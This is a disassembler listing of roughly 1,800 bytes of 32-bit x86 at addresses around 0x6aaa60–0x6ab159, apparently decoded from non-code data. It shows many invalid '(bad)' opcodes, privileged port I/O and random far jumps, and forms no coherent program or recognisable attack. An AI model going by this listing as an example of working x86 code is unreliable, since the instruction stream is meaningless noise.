  6aaa60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aaa61:	std    
  6aaa62:	mov    esp,0x9a8f9efc
  6aaa67:	lods   al,BYTE PTR ds:[esi]
  6aaa68:	rcr    DWORD PTR [esi],cl
  6aaa6a:	and    eax,0x832ed919
  6aaa6f:	and    DWORD PTR [edx-0x59],ecx
  6aaa72:	stc    
  6aaa73:	mov    esi,0x856496d9
  6aaa78:	(bad)  
  6aaa7a:	sub    eax,DWORD PTR [eax+0x46]
  6aaa7d:	fisub  DWORD PTR [edi+ecx*4]
  6aaa80:	in     al,dx
  6aaa81:	ss push eax
  6aaa83:	add    al,BYTE PTR [ebp-0x4ee3dd2f]
  6aaa89:	into   
  6aaa8a:	xlat   BYTE PTR ds:[ebx]
  6aaa8b:	(bad)  
  6aaa8c:	jge    0x6aaacf
  6aaa8e:	into   
  6aaa8f:	mov    dl,0x71
  6aaa91:	pushf  
  6aaa92:	ins    BYTE PTR es:[edi],dx
  6aaa93:	push   es
  6aaa94:	outs   dx,DWORD PTR ds:[esi]
  6aaa95:	mov    gs,WORD PTR [edx]
  6aaa97:	add    BYTE PTR [esp+esi*2+0x2cb2fa93],ah
  6aaa9e:	std    
  6aaa9f:	dec    ebp
  6aaaa0:	jb     0x6aab1d
  6aaaa2:	mov    eax,ds:0xc60073e1
  6aaaa7:	mov    ebp,gs
  6aaaa9:	adc    al,0x15
  6aaaab:	push   ebp
  6aaaac:	lea    edx,[esi]
  6aaaae:	adc    bh,0xdf
  6aaab1:	cli    
  6aaab2:	retf   
  6aaab3:	outs   dx,DWORD PTR ds:[esi]
  6aaab4:	ds clc 
  6aaab6:	mov    ds:0x686460bc,al
  6aaabb:	iret   
  6aaabc:	mov    edx,0x39ccb9cb
  6aaac1:	(bad)  
  6aaac2:	push   ebx
  6aaac3:	jle    0x6aaac3
  6aaac5:	loop   0x6aaa7e
  6aaac7:	dec    ebp
  6aaac8:	hlt    
  6aaac9:	in     eax,0x3b
  6aaacb:	in     eax,dx
  6aaacc:	imul   BYTE PTR [ebp-0x5f]
  6aaacf:	sub    ebx,esi
  6aaad1:	mov    ebp,fs
  6aaad3:	xor    ebx,ecx
  6aaad5:	adc    esi,DWORD PTR [esi-0x6e]
  6aaad8:	sub    al,0x21
  6aaada:	gs push esp
  6aaadc:	fnsave [ecx-0x52]
  6aaadf:	cmp    BYTE PTR ds:0x59f6e1fe,cl
  6aaae5:	add    eax,0xfe4c3776
  6aaaea:	hlt    
  6aaaeb:	daa    
  6aaaec:	adc    ecx,DWORD PTR [esp+edx*2]
  6aaaef:	cmp    BYTE PTR [esi+ebx*4],ch
  6aaaf2:	add    al,0x5d
  6aaaf4:	imul   edi,DWORD PTR ss:[ebx],0xfffffff5
  6aaaf8:	in     al,dx
  6aaaf9:	add    eax,0xb6a90a4c
  6aaafe:	bound  eax,QWORD PTR [ebp-0x6c22c702]
  6aab04:	aad    0xd0
  6aab06:	dec    ebx
  6aab07:	scas   al,BYTE PTR es:[edi]
  6aab08:	and    ebp,edx
  6aab0a:	loope  0x6aaad5
  6aab0c:	and    eax,0xe0ae271d
  6aab11:	push   esi
  6aab12:	cmp    DWORD PTR [edi+0x24832c1c],esp
  6aab18:	mov    ds,WORD PTR [ebp-0x7432ebc0]
  6aab1e:	mov    ebp,0x79a006f1
  6aab23:	lea    ebx,[ebx]
  6aab25:	std    
  6aab26:	pop    es
  6aab27:	lods   eax,DWORD PTR ds:[esi]
  6aab28:	add    eax,0x5a3a05dd
  6aab2d:	loopne 0x6aab6d
  6aab2f:	(bad)  
  6aab30:	adc    al,0x40
  6aab32:	mov    ecx,0x2e64c0dd
  6aab37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aab38:	push   esi
  6aab39:	pop    eax
  6aab3a:	adc    ebp,DWORD PTR [esi]
  6aab3c:	dec    eax
  6aab3d:	and    al,0x8
  6aab3f:	out    dx,eax
  6aab40:	inc    esi
  6aab41:	in     al,dx
  6aab42:	dec    edi
  6aab43:	inc    ebp
  6aab44:	aaa    
  6aab45:	jp     0x6aab04
  6aab47:	ficomp DWORD PTR [eax]
  6aab49:	outs   dx,BYTE PTR ds:[esi]
  6aab4a:	mov    ah,0x8e
  6aab4c:	stc    
  6aab4d:	pop    es
  6aab4e:	imul   ebp,DWORD PTR ds:0x6e656200,0xfffffff2
  6aab55:	stos   DWORD PTR es:[edi],eax
  6aab56:	xchg   edx,eax
  6aab57:	mov    al,ds:0xa0ac6adf
  6aab5c:	add    eax,edi
  6aab5e:	cmp    eax,DWORD PTR [ebx+0x455a832]
  6aab64:	xor    al,0x5
  6aab66:	sbb    DWORD PTR [edi],ebx
  6aab68:	lods   eax,DWORD PTR ds:[esi]
  6aab69:	clc    
  6aab6a:	mov    DWORD PTR [edi],esi
  6aab6c:	bound  ebp,QWORD PTR [edx-0x74]
  6aab6f:	sbb    al,BYTE PTR [ebx+0x30]
  6aab72:	scas   al,BYTE PTR es:[edi]
  6aab73:	add    edx,0xabb7c5dc
  6aab79:	cmp    DWORD PTR [ebp+ebp*1+0x45e54d0c],0xe185c25a
  6aab84:	shr    BYTE PTR [ecx],0x47
  6aab87:	retf   
  6aab88:	pop    edi
  6aab89:	inc    ebx
  6aab8a:	jl     0x6aabfa
  6aab8c:	out    0x71,al
  6aab8e:	daa    
  6aab8f:	pop    esp
  6aab90:	pop    ecx
  6aab91:	lahf   
  6aab92:	loope  0x6aabcf
  6aab94:	jmp    FWORD PTR [ebx-0xc]
  6aab97:	dec    ebx
  6aab98:	xor    bh,BYTE PTR [ecx+0x54781de7]
  6aab9e:	out    dx,al
  6aab9f:	jb     0x6aac05
  6aaba1:	push   esi
  6aaba2:	sub    ecx,edx
  6aaba4:	outs   dx,BYTE PTR ds:[esi]
  6aaba5:	sub    eax,0xdf7f17d5
  6aabaa:	(bad)  
  6aabab:	in     al,dx
  6aabac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aabad:	shl    bl,0xa1
  6aabb0:	xor    DWORD PTR [esi-0xe],ecx
  6aabb3:	cs push ecx
  6aabb5:	call   0xe492078
  6aabba:	pop    edx
  6aabbb:	push   eax
  6aabbc:	push   es
  6aabbd:	and    al,0x7
  6aabbf:	js     0x6aab9a
  6aabc1:	lahf   
  6aabc2:	fs cdq 
  6aabc4:	fs push esi
  6aabc6:	fistp  QWORD PTR [edi-0x5965fd32]
  6aabcc:	inc    eax
  6aabcd:	(bad)  
  6aabce:	je     0x6aab78
  6aabd0:	and    eax,0x8e67bf0b
  6aabd5:	stos   BYTE PTR es:[edi],al
  6aabd6:	cmp    al,0xa9
  6aabd8:	das    
  6aabd9:	cmp    eax,ebp
  6aabdb:	or     al,dh
  6aabdd:	das    
  6aabde:	add    esi,DWORD PTR [eax-0x52f4d71e]
  6aabe4:	mov    esp,0xe679eef8
  6aabe9:	fmul   QWORD PTR [edi]
  6aabeb:	xchg   esi,eax
  6aabec:	cs mov ch,0xd3
  6aabef:	enter  0xc67a,0xd9
  6aabf3:	add    cl,ch
  6aabf5:	push   edx
  6aabf6:	out    dx,al
  6aabf7:	loop   0x6aac20
  6aabf9:	xchg   BYTE PTR [eax-0x5f],al
  6aabfc:	mul    bl
  6aabfe:	scas   eax,DWORD PTR es:[edi]
  6aabff:	lods   al,BYTE PTR ds:[esi]
  6aac00:	cdq    
  6aac01:	xchg   edi,eax
  6aac02:	fmulp  st(1),st
  6aac04:	xor    BYTE PTR [ecx-0x65a83974],ah
  6aac0a:	xor    BYTE PTR [ecx-0x15],ah
  6aac0d:	jo     0x6aac19
  6aac0f:	cmp    dh,ah
  6aac11:	dec    esp
  6aac12:	nop
  6aac13:	test   BYTE PTR [edi-0x7ffefcab],0x4b
  6aac1a:	push   0xfffffff7
  6aac1c:	xchg   ebp,eax
  6aac1d:	pop    ecx
  6aac1e:	cmc    
  6aac1f:	repnz stc 
  6aac21:	mov    ds:0x64c8cf60,al
  6aac26:	aas    
  6aac27:	int    0x74
  6aac29:	les    ebp,FWORD PTR [edi]
  6aac2b:	(bad)  
  6aac2d:	mov    ah,0xc6
  6aac2f:	mov    edi,0x3aa9f109
  6aac34:	mov    dh,0x44
  6aac36:	es dec edx
  6aac38:	add    dh,ch
  6aac3a:	pop    ebp
  6aac3b:	(bad)  
  6aac3c:	pusha  
  6aac3d:	sub    dh,BYTE PTR [eax]
  6aac3f:	inc    esi
  6aac40:	mov    ch,BYTE PTR [esi+0x5e64c30a]
  6aac46:	sbb    BYTE PTR [edi+0x3b],dh
  6aac49:	popa   
  6aac4a:	scas   eax,DWORD PTR es:[edi]
  6aac4b:	je     0x6aacb1
  6aac4d:	mov    eax,ds:0x6c803de4
  6aac52:	fcom   DWORD PTR [eax+0x49f2b5e5]
  6aac58:	pop    ss
  6aac59:	jecxz  0x6aac27
  6aac5b:	shl    DWORD PTR [edx-0x38222c3a],cl
  6aac61:	and    DWORD PTR [ecx-0x6ee18c6e],ebp
  6aac67:	cs sub al,0x39
  6aac6a:	mov    bh,0x1
  6aac6c:	xor    esi,ebp
  6aac6e:	sbb    edx,edx
  6aac70:	jb     0x6aac6f
  6aac72:	sahf   
  6aac73:	xlat   BYTE PTR ds:[ebx]
  6aac74:	adc    cl,BYTE PTR ss:[eax+0x4b6f5efa]
  6aac7b:	in     eax,dx
  6aac7c:	cmp    BYTE PTR [ebp+0x6524c7a3],0xfb
  6aac83:	std    
  6aac84:	outs   dx,BYTE PTR ds:[esi]
  6aac85:	push   ecx
  6aac86:	add    ah,bh
  6aac88:	jno    0x6aaceb
  6aac8a:	ficom  DWORD PTR ds:0xdfa37bca
  6aac90:	shl    BYTE PTR [ebp-0x5b],1
  6aac93:	mov    ah,0x6d
  6aac95:	and    al,0x2a
  6aac97:	hlt    
  6aac98:	xchg   edx,eax
  6aac99:	push   es
  6aac9a:	jmp    0x4416:0xe42dcf8a
  6aaca1:	loop   0x6aac8a
  6aaca3:	pop    edi
  6aaca4:	pop    esi
  6aaca5:	shr    DWORD PTR [esi],0xc8
  6aaca8:	je     0x6aac37
  6aacaa:	jb     0x6aac57
  6aacac:	cld    
  6aacad:	cli    
  6aacae:	daa    
  6aacaf:	adc    al,0x7a
  6aacb1:	mov    al,cs:0xdfce0738
  6aacb7:	jbe    0x6aacb6
  6aacb9:	mov    esp,0xd5241aec
  6aacbe:	sbb    bl,BYTE PTR [ebp-0x6d]
  6aacc1:	and    DWORD PTR [esi+0x11],edi
  6aacc4:	pop    ss
  6aacc5:	jne    0x6aacf7
  6aacc7:	daa    
  6aacc8:	outs   dx,DWORD PTR ds:[esi]
  6aacc9:	adc    ch,BYTE PTR [edi-0x3a3eb57]
  6aaccf:	stc    
  6aacd0:	dec    esp
  6aacd1:	push   ebx
  6aacd2:	push   0x71
  6aacd4:	sub    al,0x96
  6aacd6:	std    
  6aacd7:	and    BYTE PTR [edi-0x3e95b9da],bh
  6aacdd:	shl    BYTE PTR [ecx],cl
  6aacdf:	jl     0x6aad37
  6aace1:	xor    DWORD PTR [edx],ebx
  6aace3:	dec    edx
  6aace4:	clc    
  6aace5:	mov    dh,al
  6aace7:	test   BYTE PTR [eax+eax*1+0x7e],bh
  6aaceb:	xchg   ebx,eax
  6aacec:	into   
  6aaced:	cmp    eax,0x86137f68
  6aacf2:	push   esi
  6aacf3:	retf   
  6aacf4:	cld    
  6aacf5:	es mov esi,0xf3628bf9
  6aacfb:	out    dx,al
  6aacfc:	sub    al,0x3f
  6aacfe:	cmp    al,0x73
  6aad00:	imul   ebx,DWORD PTR [eax],0xffffffa8
  6aad03:	fwait
  6aad04:	rol    esi,1
  6aad06:	shl    BYTE PTR [esi+edi*4],cl
  6aad09:	ja     0x6aacb9
  6aad0b:	mov    cl,0x97
  6aad0d:	inc    eax
  6aad0e:	adc    BYTE PTR [esi+0x7c96e9],al
  6aad14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aad15:	sub    edx,edx
  6aad17:	pop    edi
  6aad18:	sbb    al,0x55
  6aad1a:	call   0x5e2e:0xa3edd7c5
  6aad21:	lods   al,BYTE PTR ds:[esi]
  6aad22:	jnp    0x6aad91
  6aad24:	fstp   TBYTE PTR [edi]
  6aad26:	(bad)  
  6aad27:	sbb    eax,0xbbe03832
  6aad2c:	xlat   BYTE PTR ds:[ebx]
  6aad2d:	out    0xb1,eax
  6aad2f:	sbb    eax,0xd3a75824
  6aad34:	xor    bl,BYTE PTR [ecx]
  6aad36:	enter  0xed93,0x92
  6aad3a:	ret    0xdbfb
  6aad3d:	inc    edx
  6aad3e:	and    DWORD PTR [ecx+0x1b7ff63a],edi
  6aad44:	out    dx,eax
  6aad45:	cs push ebx
  6aad47:	cdq    
  6aad48:	mov    ds:0x597db1c7,al
  6aad4d:	inc    edi
  6aad4e:	pop    ecx
  6aad4f:	mov    al,ds:0x25752c14
  6aad54:	sbb    DWORD PTR [eax+0x3e595949],edi
  6aad5a:	lahf   
  6aad5b:	mov    eax,0x11049fee
  6aad60:	add    bl,BYTE PTR [edx+0x63c37188]
  6aad66:	xor    al,0xb4
  6aad68:	mov    esi,0xb8338e40
  6aad6d:	(bad)  
  6aad6e:	mov    edi,0xe4d55bd5
  6aad73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aad74:	mov    ebp,0x34faba22
  6aad79:	adc    DWORD PTR [edi+0x156e3557],ecx
  6aad7f:	mov    al,0xa7
  6aad81:	in     eax,0xc7
  6aad83:	(bad)  
  6aad84:	je     0x6aadf7
  6aad86:	xor    DWORD PTR [ecx+0x9],eax
  6aad89:	lods   al,BYTE PTR ss:[esi]
  6aad8b:	fdiv   QWORD PTR [esi-0xf]
  6aad8e:	and    BYTE PTR [ecx],bl
  6aad90:	dec    ebp
  6aad91:	and    eax,0xe4f72110
  6aad96:	xchg   dh,bl
  6aad98:	add    esp,DWORD PTR [ebp+0x76b59818]
  6aad9e:	in     eax,dx
  6aad9f:	jns    0x6aadfd
  6aada1:	jge    0x6aadeb
  6aada3:	rol    BYTE PTR [ecx+ebx*2-0x2b],1
  6aada7:	jne    0x6aadc8
  6aada9:	(bad)  
  6aadaa:	mov    eax,ds:0x8a1bb729
  6aadaf:	mov    dh,0xd9
  6aadb1:	dec    ecx
  6aadb2:	lahf   
  6aadb3:	sbb    al,0xa1
  6aadb5:	jl     0x6aadee
  6aadb7:	push   es
  6aadb8:	pop    ebp
  6aadb9:	or     al,BYTE PTR [eax]
  6aadbb:	mov    esi,0x988c85c9
  6aadc0:	or     dh,BYTE PTR [eax+0x1eb82e39]
  6aadc6:	cmp    dx,WORD PTR [ebx+0x4e975692]
  6aadcd:	mov    dh,0x45
  6aadcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aadd0:	std    
  6aadd1:	outs   dx,DWORD PTR ds:[esi]
  6aadd2:	mov    edi,0x70efb029
  6aadd7:	mov    ds:0x3571e260,eax
  6aaddc:	dec    esi
  6aaddd:	ret    0x38d9
  6aade0:	inc    esi
  6aade1:	ret    0x4df1
  6aade4:	mov    eax,0xb4af22dd
  6aade9:	out    0xbe,eax
  6aadeb:	mov    ebp,0xc669d977
  6aadf0:	jl     0x6aadc2
  6aadf2:	xchg   DWORD PTR ds:0xabde3f2a,ecx
  6aadf8:	repnz mov eax,DWORD PTR [edx-0x75188446]
  6aadff:	pop    edi
  6aae00:	adc    DWORD PTR [edi+ecx*2],edi
  6aae03:	pop    edx
  6aae04:	xchg   esi,eax
  6aae05:	mov    eax,ds:0x7653552
  6aae0a:	repnz push ss
  6aae0c:	call   0xec5724f1
  6aae11:	call   0x4ada:0x48da7af3
  6aae18:	pop    DWORD PTR [edi]
  6aae1a:	addr16 add eax,0xd8e0e1dd
  6aae20:	ja     0x6aae1e
  6aae22:	pop    es
  6aae23:	push   0x6d
  6aae25:	test   DWORD PTR [edi-0x56],eax
  6aae28:	stos   DWORD PTR es:[edi],eax
  6aae29:	pop    ecx
  6aae2a:	(bad)  
  6aae2b:	xchg   edi,eax
  6aae2c:	cmp    DWORD PTR [edx],0x68
  6aae2f:	daa    
  6aae30:	sub    eax,0x571b7a4f
  6aae35:	xchg   ebx,eax
  6aae36:	ja     0x6aaeb4
  6aae38:	push   esp
  6aae39:	add    esp,DWORD PTR [ecx+0x3f]
  6aae3c:	int3   
  6aae3d:	shl    BYTE PTR [esi+0x3b],1
  6aae40:	adc    al,0x2d
  6aae42:	imul   ebp,ebp,0xfffffff3
  6aae45:	punpckhdq mm2,QWORD PTR [edi]
  6aae48:	fdiv   st,st(5)
  6aae4a:	jge    0x6aae93
  6aae4c:	mov    ebx,0xa5f04fc1
  6aae51:	dec    edx
  6aae52:	inc    ebx
  6aae53:	cmp    ecx,DWORD PTR [edx-0x35]
  6aae56:	aas    
  6aae57:	xchg   BYTE PTR [edi],dl
  6aae59:	sub    al,0xa2
  6aae5b:	lock int 0x1c
  6aae5e:	cmp    esi,DWORD PTR [ebp-0x2b06c409]
  6aae64:	mov    eax,ds:0x62e4c0b7
  6aae69:	(bad)  
  6aae6a:	int    0x16
  6aae6c:	stos   BYTE PTR es:[edi],al
  6aae6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aae6e:	or     eax,0xc02b439c
  6aae73:	dec    edi
  6aae74:	xchg   BYTE PTR [ebx],bl
  6aae76:	push   ebp
  6aae77:	das    
  6aae78:	div    dl
  6aae7a:	and    eax,0x9a88005d
  6aae7f:	add    al,0xd
  6aae81:	jo     0x6aaec3
  6aae83:	or     ah,0x14
  6aae86:	mov    ecx,0x1a092204
  6aae8b:	push   ss
  6aae8c:	cmp    ecx,DWORD PTR [edi]
  6aae8e:	sbb    al,0xd8
  6aae90:	xchg   ebx,eax
  6aae91:	ins    BYTE PTR es:[edi],dx
  6aae92:	cs and eax,0xcfb44292
  6aae98:	sar    BYTE PTR [esi-0x219e27c3],0x21
  6aae9f:	cmp    BYTE PTR [eax+0x27dbb70c],al
  6aaea5:	sub    bh,BYTE PTR [edi+0xf0a12df]
  6aaeab:	push   ebx
  6aaeac:	daa    
  6aaead:	shl    DWORD PTR [esi],cl
  6aaeaf:	mov    ds:0x67d6bd08,al
  6aaeb4:	or     DWORD PTR [ebp+0x7e],esi
  6aaeb7:	mov    ecx,0x52442a7e
  6aaebc:	xchg   ecx,eax
  6aaebd:	jmp    0xdd6e:0xbf74e664
  6aaec4:	sub    BYTE PTR [ecx],ch
  6aaec6:	mov    dl,0xa6
  6aaec8:	cmp    DWORD PTR [eax-0x30d059ca],esi
  6aaece:	setnp  BYTE PTR [esi+0x11]
  6aaed2:	jl     0x6aaea7
  6aaed4:	xchg   ebp,eax
  6aaed5:	hlt    
  6aaed6:	nop
  6aaed7:	lods   al,BYTE PTR ds:[esi]
  6aaed8:	and    BYTE PTR [ebp*1+0x31b631a],dh
  6aaedf:	mov    dh,bl
  6aaee1:	shl    DWORD PTR [edi],1
  6aaee3:	in     al,0x6e
  6aaee5:	xlat   BYTE PTR ds:[ebx]
  6aaee6:	repz pop esi
  6aaee8:	jmp    0x506c:0x829599c
  6aaeef:	push   es
  6aaef0:	shl    cl,0x74
  6aaef3:	add    eax,DWORD PTR [ebp+0x3]
  6aaef6:	ins    BYTE PTR es:[edi],dx
  6aaef7:	inc    edx
  6aaef8:	dec    ecx
  6aaef9:	xchg   ebp,eax
  6aaefa:	stos   DWORD PTR es:[edi],eax
  6aaefb:	outs   dx,DWORD PTR ds:[esi]
  6aaefc:	cmp    ah,BYTE PTR [esi]
  6aaefe:	and    DWORD PTR [ebx-0x254bcdd7],esi
  6aaf04:	leave  
  6aaf05:	jl     0x6aaf3d
  6aaf07:	aas    
  6aaf08:	bound  esi,QWORD PTR [eax-0x5bc86e9a]
  6aaf0e:	pushf  
  6aaf0f:	arpl   WORD PTR [edi-0x5b],dx
  6aaf12:	xchg   esp,eax
  6aaf13:	fidivr DWORD PTR [edx]
  6aaf15:	xchg   esi,eax
  6aaf16:	sbb    BYTE PTR [esi-0x6d67d6ce],0x67
  6aaf1d:	scas   al,BYTE PTR es:[edi]
  6aaf1e:	adc    eax,0xa30be079
  6aaf23:	and    DWORD PTR [ebx+0x45],eax
  6aaf26:	addr16 pop edx
  6aaf28:	or     esi,DWORD PTR [ebx+ecx*4+0x77]
  6aaf2c:	ret    0xd83b
  6aaf2f:	cwde   
  6aaf30:	sti    
  6aaf31:	xchg   BYTE PTR ds:0xa17fd7ae,al
  6aaf37:	inc    esp
  6aaf38:	enter  0x9efe,0xad
  6aaf3c:	xchg   ecx,eax
  6aaf3d:	or     al,0x39
  6aaf3f:	sub    edx,ebx
  6aaf41:	sbb    ecx,DWORD PTR [ebp+0x75977d22]
  6aaf47:	ins    DWORD PTR es:[edi],dx
  6aaf48:	xchg   edx,eax
  6aaf49:	or     dh,BYTE PTR ds:0x19f8e337
  6aaf4f:	(bad)  
  6aaf50:	xchg   edx,eax
  6aaf51:	cmp    eax,0x826abf1f
  6aaf56:	call   0xb5e41eb8
  6aaf5b:	fcmovnbe st,st(2)
  6aaf5d:	jecxz  0x6aaf93
  6aaf5f:	addr16 pop es
  6aaf61:	lods   eax,DWORD PTR ds:[esi]
  6aaf62:	leave  
  6aaf63:	mov    bl,0x54
  6aaf65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aaf66:	rcr    DWORD PTR [ebx],cl
  6aaf68:	cmp    dl,BYTE PTR [esp+ebp*1]
  6aaf6b:	xor    BYTE PTR [ebp+ebp*8+0x4de885f],0x0
  6aaf73:	xor    eax,eax
  6aaf75:	jnp    0x6aaf90
  6aaf77:	or     eax,0x7dea49e3
  6aaf7c:	add    DWORD PTR [eax-0x75bd812a],esi
  6aaf82:	push   eax
  6aaf83:	add    ecx,edi
  6aaf85:	stos   BYTE PTR es:[edi],al
  6aaf86:	mov    bh,0x2
  6aaf88:	xor    ch,cl
  6aaf8a:	hlt    
  6aaf8b:	mov    ebp,0xc987fd08
  6aaf90:	sbb    DWORD PTR fs:[ecx-0x12],esi
  6aaf94:	inc    ebp
  6aaf95:	and    edx,DWORD PTR [eax]
  6aaf97:	mov    ebp,0xfb7bb0b3
  6aaf9c:	out    0x97,al
  6aaf9e:	xor    ch,ah
  6aafa0:	(bad)  
  6aafa2:	cmc    
  6aafa3:	je     0x6aafa1
  6aafa5:	add    eax,0xcf92fbe9
  6aafaa:	cmp    BYTE PTR [esi+0x70],bl
  6aafad:	jno    0x6aafd0
  6aafaf:	in     al,0xf2
  6aafb1:	push   cs
  6aafb2:	push   esi
  6aafb3:	arpl   WORD PTR [esi+ebp*8-0x58152b6],bx
  6aafba:	gs dec eax
  6aafbc:	imul   ecx,ebx,0x6a459e80
  6aafc2:	(bad)  [ebx]
  6aafc4:	test   DWORD PTR [ebp+0x3e],esp
  6aafc7:	dec    edi
  6aafc8:	fisttp QWORD PTR [ecx+0x7c26343f]
  6aafce:	pop    ebx
  6aafcf:	sbb    eax,eax
  6aafd1:	shl    ah,1
  6aafd3:	inc    ch
  6aafd5:	(bad)  
  6aafd6:	(bad)  
  6aafd7:	iret   
  6aafd8:	jge    0x6aaff8
  6aafda:	ds sti 
  6aafdc:	sbb    DWORD PTR [ebx],eax
  6aafde:	outs   dx,BYTE PTR ds:[esi]
  6aafdf:	push   0xaa3a5620
  6aafe4:	cmp    BYTE PTR [ecx-0x3e],bh
  6aafe7:	dec    edi
  6aafe8:	popf   
  6aafe9:	pusha  
  6aafea:	jecxz  0x6aafb2
  6aafec:	or     DWORD PTR [esp+ecx*2+0x49],edx
  6aaff0:	cmp    eax,0x89427bdc
  6aaff5:	dec    ecx
  6aaff6:	fdivr  DWORD PTR [edi]
  6aaff8:	and    BYTE PTR [ecx],ch
  6aaffa:	leave  
  6aaffb:	shr    BYTE PTR ds:0x52d3b32d,1
  6ab001:	cld    
  6ab002:	test   eax,0x98e78b38
  6ab007:	sbb    al,bl
  6ab009:	jg     0x6ab065
  6ab00b:	ror    eax,cl
  6ab00d:	mov    ebx,0xa5e3e77a
  6ab012:	xor    al,0x8e
  6ab014:	cmp    esp,DWORD PTR [esp+eax*2-0x5a]
  6ab018:	cmp    eax,0xaf526d65
  6ab01d:	lea    edi,[edi]
  6ab01f:	leave  
  6ab020:	or     BYTE PTR [ebx],cl
  6ab022:	adc    al,0xfe
  6ab024:	inc    ecx
  6ab025:	pop    ss
  6ab026:	shl    esi,0x42
  6ab029:	fld    TBYTE PTR [ebp-0x74]
  6ab02c:	mov    dh,0x52
  6ab02e:	add    DWORD PTR [ecx],esp
  6ab030:	fstp   DWORD PTR [eax+0x67]
  6ab033:	xchg   esi,eax
  6ab034:	or     bl,BYTE PTR [ebp+0x198009ed]
  6ab03a:	mov    ah,0xc9
  6ab03c:	inc    ebx
  6ab03d:	outs   dx,DWORD PTR ds:[esi]
  6ab03e:	stos   BYTE PTR es:[edi],al
  6ab03f:	mov    bh,0x4a
  6ab041:	pop    ds
  6ab042:	cmp    eax,DWORD PTR [esp+esi*8+0x38]
  6ab046:	xchg   ebp,eax
  6ab047:	jne    0x6ab027
  6ab049:	mov    eax,0xbe95176b
  6ab04e:	add    BYTE PTR [eiz*8+0x4cad3c82],bl
  6ab055:	fistp  WORD PTR [eax]
  6ab057:	int    0xee
  6ab059:	ffree  st(2)
  6ab05b:	push   esp
  6ab05c:	push   ebx
  6ab05d:	and    al,0xf9
  6ab05f:	add    al,0xc9
  6ab061:	ins    DWORD PTR es:[edi],dx
  6ab062:	out    dx,al
  6ab063:	mov    dh,0x30
  6ab065:	jno    0x6ab01f
  6ab067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ab068:	xor    BYTE PTR [edx+0x20d04d58],ch
  6ab06e:	push   edi
  6ab06f:	lods   al,BYTE PTR ds:[esi]
  6ab070:	cwde   
  6ab071:	dec    esp
  6ab072:	xchg   ecx,eax
  6ab073:	fld    DWORD PTR [ebx]
  6ab075:	lahf   
  6ab076:	xor    edi,ebp
  6ab078:	test   BYTE PTR [eax-0x76f29f1b],cl
  6ab07e:	mov    bl,0xc8
  6ab080:	xchg   ebp,eax
  6ab081:	dec    esp
  6ab082:	popa   
  6ab083:	nop
  6ab084:	xor    esp,DWORD PTR [ebp+ecx*2-0x31]
  6ab088:	xor    esp,DWORD PTR [ecx+0x3b8c0eed]
  6ab08e:	jg     0x6ab0ee
  6ab090:	(bad)  
  6ab091:	xchg   esp,eax
  6ab092:	mov    ebp,0x3173642a
  6ab097:	jmp    0xe444:0xcbe670a4
  6ab09e:	fadd   DWORD PTR [ebp+0x3e]
  6ab0a1:	and    edx,DWORD PTR [ebx+0x48]
  6ab0a4:	(bad)  
  6ab0a5:	or     BYTE PTR [ecx-0x33b75d34],cl
  6ab0ab:	mov    WORD PTR [ebx-0x55d5fdcc],?
  6ab0b1:	aas    
  6ab0b2:	mov    eax,ds:0xbc9e0271
  6ab0b7:	xchg   dl,dl
  6ab0b9:	jecxz  0x6ab105
  6ab0bb:	loopne 0x6ab070
  6ab0bd:	ins    DWORD PTR es:[edi],dx
  6ab0be:	xchg   ebx,eax
  6ab0bf:	mov    ss,WORD PTR [edi]
  6ab0c1:	stos   BYTE PTR es:[edi],al
  6ab0c2:	(bad)  
  6ab0c3:	outs   dx,DWORD PTR ds:[esi]
  6ab0c4:	adc    al,BYTE PTR [edx+edx*1-0x7cfa8c79]
  6ab0cb:	(bad)  
  6ab0cc:	aam    0xcb
  6ab0ce:	inc    edx
  6ab0cf:	jle    0x6ab06c
  6ab0d1:	jmp    0xc7fb62f
  6ab0d6:	mov    bh,0x63
  6ab0d9:	xor    DWORD PTR [ecx],edi
  6ab0db:	cmp    eax,0x4249fc4d
  6ab0e0:	es int 0x17
  6ab0e3:	scas   al,BYTE PTR es:[edi]
  6ab0e4:	aaa    
  6ab0e5:	sbb    esp,DWORD PTR [edi]
  6ab0e7:	and    eax,0xf2e520e2
  6ab0ec:	and    edx,edx
  6ab0ee:	stos   DWORD PTR es:[edi],eax
  6ab0ef:	mov    ebx,0xf7009b7e
  6ab0f4:	adc    DWORD PTR [ebx+0x49],ecx
  6ab0f7:	nop
  6ab0f8:	std    
  6ab0f9:	inc    ebx
  6ab0fa:	(bad)  
  6ab0fb:	mov    dl,0xff
  6ab0fd:	adc    BYTE PTR [eax+ebx*8-0x4782c0af],dh
  6ab104:	loope  0x6ab0a0
  6ab106:	shl    esp,cl
  6ab108:	shl    DWORD PTR [ebx-0x7],cl
  6ab10b:	repnz popa 
  6ab10d:	and    DWORD PTR [ebx-0x56c010e8],ebx
  6ab113:	push   esp
  6ab114:	shl    ch,1
  6ab116:	test   al,0x74
  6ab118:	pop    esi
  6ab119:	fdivr  QWORD PTR ds:0x277ca48d
  6ab11f:	push   edi
  6ab120:	scas   eax,DWORD PTR es:[edi]
  6ab121:	mov    BYTE PTR [ebx+0x638fbee],dl
  6ab127:	je     0x6ab15c
  6ab129:	data16 hlt 
  6ab12b:	cmp    dh,BYTE PTR [ecx+0x19]
  6ab12e:	enter  0x7952,0xed
  6ab132:	cmp    al,0xd1
  6ab134:	mov    ch,0x81
  6ab136:	popf   
  6ab137:	mov    ds:0x93bd3f11,al
  6ab13c:	fst    DWORD PTR [ecx+0x1e]
  6ab13f:	shl    eax,cl
  6ab141:	mov    bh,0x8f
  6ab143:	pop    es
  6ab144:	pop    edx
  6ab145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ab146:	push   ds
  6ab147:	retf   
  6ab148:	jo     0x6ab1c9
  6ab14a:	jmp    0x6ab19c
  6ab14c:	xor    eax,0x10256fee
  6ab151:	jb     0x6ab14b
  6ab153:	shl    eax,cl
  6ab155:	adc    DWORD PTR [ebx],ebp
  6ab157:	jnp    0x6ab10b
  6ab159:	imul   ebp,ebp,0x32e29167
